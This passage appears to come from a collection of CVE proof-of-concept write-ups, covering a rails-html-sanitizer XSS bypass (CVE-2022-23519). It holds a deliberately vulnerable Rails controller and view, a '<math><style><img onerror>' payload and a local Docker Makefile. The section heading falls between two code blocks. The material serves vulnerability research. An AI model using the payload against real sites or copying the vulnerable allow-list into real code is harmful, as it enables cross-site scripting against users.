# make Poc2 endpoint
# http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E
bin/rails generate controller Poc2 index --skip-routes

cat << EOF > ./app/controllers/poc2_controller.rb
class Poc2Controller < ApplicationController
  def index
    @name = params[:name] || "put your name here"
  end
end
EOF


cat << EOF > ./app/views/poc2/index.html.erb
<h1> Hello <%= sanitize @name, tags: ["math", "style"] %> </h1>
<br>
PoC with a sanitized, reflected parameter 'name' for which 'math' annd 'style' tags are allowed.
<br>
<%= link_to "Go to PoC", "/poc2?name=<math><style><img src=x onerror=alert(1)></style><math>" %>
<br>
<br>
Using: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>
EOF
```

## 43. CVE-2022-23519
- Source: `telegram writeups (verbatim excerpts)`

```
.PHONY: build
build:
	docker build -t local/railspoc:latest .

.PHONY: run
run:
	docker run -it --rm -p 127.0.0.1:8888:3000 local/railspoc:latest
```
